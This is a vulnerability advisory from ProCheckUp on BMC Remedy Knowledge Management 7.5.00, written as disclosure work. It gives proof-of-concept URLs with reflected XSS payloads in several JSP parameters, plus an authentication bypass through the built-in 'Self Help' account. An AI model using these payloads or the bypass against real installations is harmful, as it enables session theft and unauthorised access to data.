PR10-13: Multiple XSS and Authentication flaws within BMC Remedy
Knowledge Management

Vulnerability found: 17th July 2010

Vendor informed:

Vulnerability fixed:

Severity: High

Description:

BMC Remedy Knowledge Management provides service desk analysts with a
knowledge base of easy-to-find solutions and gives users self-service
search options to help them resolve issues on their own. ProCheckUp has
discovered that multiple Remedy Knowledge Management pages are
vulnerable to reflective XSS attacks, a built in self help account
allows for authentication bypass.

Version: 7.5.00    - http://www.bmc.com/


1) The following demonstrate the reflective XSS flaws

https://target-domain.foo/rkm/external.jsp?doc='%3balert(1)//&user=Self+Help

https://target-domain.foo/rkm/search.jsp?user=Self+Help&startDate=\'%3balert(1)//

https://target-domain.foo/rkm/usersettings.jsp?"><script>alert(1)</script>

https://target-domain.foo/rkm/viewdoc.jsp?doc=><script>alert(1)</script>&user=Self%20Help

Works on IE - login screen referrer XSS
https://target-domain.foo/rkm/AttachmentServlet?="><script>alert(1)</script>

Consequences:
An attacker may be able to cause execution of malicious scripting code
in the browser of a user who clicks on a link to Remedy Knowledge
Management based site. Such code would run within the security context
of the target domain. This type of attack can result in non-persistent
defacement of the target site, or the redirection of confidential
information (i.e.: session IDs) to unauthorised third parties.

2) Remedy Knowledge  Management is vulnerable to authentication bypass
by using a built in default account. (user=Self%20Help)

https://target-domain.foo/rkm/index.jsp?user=Self%20Help

The following directory requires a password to authenticate only
https://target-domain.foo/rkm/configuration


Consequences:
An attacker may be able to gain access to data held within a Remedy
Knowledge Managment based site.


Fix:
